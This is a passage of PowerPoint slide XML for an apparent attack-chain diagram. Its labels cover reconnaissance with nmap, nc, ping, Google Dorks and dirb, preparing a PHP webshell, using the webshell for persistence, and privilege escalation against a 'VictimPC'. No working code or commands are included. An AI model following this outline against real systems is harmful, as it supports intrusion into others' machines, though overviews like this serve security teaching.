                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="8990237" y="5765648"/>
              <a:ext cx="1126671" cy="1045029"/>
              <a:chOff x="8990237" y="5765648"/>
              <a:chExt cx="1126671" cy="1045029"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="12" name="四角形: 角を丸くする 11">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F14B437A-2B0B-44AD-AF71-F1AF5E41D9F2}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8990237" y="5765648"/>
                <a:ext cx="1126671" cy="759279"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">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二等辺三角形 12">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{97994570-5827-40E1-8E3D-1C809DD45B31}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="9221561" y="6524927"/>
                <a:ext cx="664027" cy="285750"/>
              </a:xfrm>
              <a:prstGeom prst="triangle">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正方形/長方形 13">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD9F8244-71D9-4198-9904-14600F67E93E}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="9108620" y="5872388"/>
                <a:ext cx="889907" cy="545798"/>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16" name="テキスト ボックス 15">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DA7A626E-6384-42E6-9251-808D681D8E8D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="9192306" y="5976862"/>
              <a:ext cx="1967592" cy="261610"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1050" dirty="0" err="1"/>
                <a:t>VictimPC</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1050" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="矢印: 上向き折線 24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24E84BF4-CB74-48E5-A81A-56A712BF96C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3665917" y="-530763"/>
            <a:ext cx="4431375" cy="10454528"/>
          </a:xfrm>
          <a:prstGeom prst="bentUpArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 11281"/>
              <a:gd name="adj2" fmla="val 10814"/>
              <a:gd name="adj3" fmla="val 35780"/>
            </a:avLst>
          </a:prstGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2">
            <a:schemeClr val="lt1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:lnRef>
          <a:fillRef idx="1">
            <a:schemeClr val="accent1">
              <a:tint val="50000"/>
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:fillRef>
          <a:effectRef idx="0">
            <a:schemeClr val="accent1">
              <a:tint val="50000"/>
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="lt1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:fontRef>
        </p:style>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="グループ化 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10752D72-3091-4B56-9267-55205B06D228}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1632607" y="1541776"/>
            <a:ext cx="4686162" cy="756022"/>
            <a:chOff x="2491468" y="1520261"/>
            <a:chExt cx="7780899" cy="1016191"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="24" name="四角形: 角を丸くする 23">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{294B98B6-E090-4843-8525-656F7ED7D48B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491468" y="1520261"/>
              <a:ext cx="7780899" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="30" name="四角形: 角を丸くする 29">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B24F1EF-D430-42F2-B552-049B28001865}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2607801" y="1654106"/>
              <a:ext cx="1967592" cy="356263"/>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1100" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Reconnaissance</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="2" name="テキスト ボックス 1">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2DB347B2-3F3C-40C7-9914-B443049E01A5}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4619958" y="1543592"/>
              <a:ext cx="5412921" cy="992860"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Portscan,HOSTscan</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Website(URL, Layout)</a:t>
              </a:r>
              <a:br>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
              </a:br>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="17" name="グループ化 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5E787FA3-C72F-4243-872B-1F8EB485D1E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1611564" y="3028600"/>
            <a:ext cx="4686162" cy="523220"/>
            <a:chOff x="2491467" y="2290790"/>
            <a:chExt cx="7780901" cy="824318"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="四角形: 角を丸くする 25">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6104BA1F-5E5C-4D19-BDF5-8CB7A3A724F0}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491467" y="2402584"/>
              <a:ext cx="7780901" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="5" name="グループ化 4">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D3A17D01-9D8D-468C-A143-12D4A7C06864}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671764" y="2290790"/>
              <a:ext cx="7575674" cy="824318"/>
              <a:chOff x="2671764" y="2290790"/>
              <a:chExt cx="7575674" cy="824318"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="31" name="四角形: 角を丸くする 30">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8BD7D45A-C104-4B41-81DC-5F78001649AE}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671764" y="2520750"/>
                <a:ext cx="1967592" cy="444288"/>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200" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Weaponization</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="27" name="テキスト ボックス 26">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{462A7246-78FD-462B-A575-9447FB11CF81}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4588234" y="2290790"/>
                <a:ext cx="5659204" cy="824318"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>prepare tools</a:t>
                </a:r>
                <a:br>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                </a:br>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>prepare </a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>webshell,php</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="グループ化 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{204AC1E6-E537-4172-A461-7ABD8230CC85}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6624585" y="3086394"/>
            <a:ext cx="4749018" cy="499617"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7885266" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="34" name="四角形: 角を丸くする 33">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ADC5810C-268B-4B77-AFB9-377D7E31E1FA}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2472065" y="3278783"/>
              <a:ext cx="7825471" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="35" name="四角形: 角を丸くする 34">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0A027BF5-CF9E-4D80-9DB7-E6C22C87E656}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2627194" y="3383918"/>
              <a:ext cx="1967592" cy="444288"/>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200" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Persistence</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="29" name="テキスト ボックス 28">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A607270-D263-4193-850D-B9016329C0C3}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4771937" y="3319285"/>
              <a:ext cx="5585394" cy="523220"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>use </a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>webshell</a:t>
              </a:r>
              <a:br>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
              </a:br>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="テキスト ボックス 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67DC3C26-A69A-4D87-B44D-E707C0D4E273}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11241317" y="5988824"/>
            <a:ext cx="584968" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="テキスト ボックス 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{55732190-C9A7-4CFC-BA51-6E6A5EF8E2EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1661786" y="2085474"/>
            <a:ext cx="4387181" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>Portscan:nmap,nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>ipscan:ping,nmap,nc</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>Website:Google</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>Dorks,dirb</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="40" name="グループ化 39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F5F1FA9-31DB-458E-B9E7-CDDE1613C0AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6606116" y="4660744"/>
            <a:ext cx="5026053" cy="595176"/>
            <a:chOff x="2491462" y="4146186"/>
            <a:chExt cx="8345254" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="41" name="四角形: 角を丸くする 40">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{330374DF-55CB-4607-AB91-EF703A5F6BBA}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491462" y="4146186"/>
              <a:ext cx="7825471" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="42" name="グループ化 41">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5622D2E7-B74B-4299-802F-5B18CE535E4C}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671758" y="4190002"/>
              <a:ext cx="8164958" cy="568193"/>
              <a:chOff x="2671758" y="4190002"/>
              <a:chExt cx="8164958" cy="568193"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="43" name="四角形: 角を丸くする 42">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F620D5B7-F779-425B-9769-B3388581BCA1}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671758" y="4254740"/>
                <a:ext cx="1967592" cy="444288"/>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400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Privilege escalation</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="44" name="テキスト ボックス 43">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E453680-4964-452E-8D8E-32868BDFD542}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4731540" y="4190002"/>
                <a:ext cx="6105176" cy="568193"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Use tool</a:t>
                </a:r>
              </a:p>
              <a:p>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="55" name="グループ化 54">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B356C850-D500-4B6F-934E-FDA708D157EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1632607" y="4654253"/>
            <a:ext cx="4784299" cy="573528"/>
            <a:chOff x="2491467" y="2402584"/>
            <a:chExt cx="7943848" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
